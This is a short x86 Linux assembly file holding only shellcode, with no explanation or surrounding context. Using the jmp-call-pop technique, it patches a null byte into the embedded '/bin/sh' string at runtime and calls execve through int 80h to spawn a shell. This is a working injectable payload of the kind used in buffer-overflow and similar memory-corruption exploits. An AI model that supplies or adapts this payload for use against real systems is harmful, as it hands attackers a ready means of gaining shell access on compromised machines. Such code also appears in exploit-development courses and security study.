section .text

global _start

_start:
	jmp short shellcodestr

decode:
	pop esi
	xor eax,eax

	mov byte[esi+7],al
	mov dword[esi+8],esi
	mov dword[esi+12],eax

	lea ebx,[esi]
	lea ecx,[esi+8]
	lea edx,[esi+12]

	mov al,0xb
	int 80h


shellcodestr:
	call decode
	shellcode : db "/bin/shABBBBCCCC"
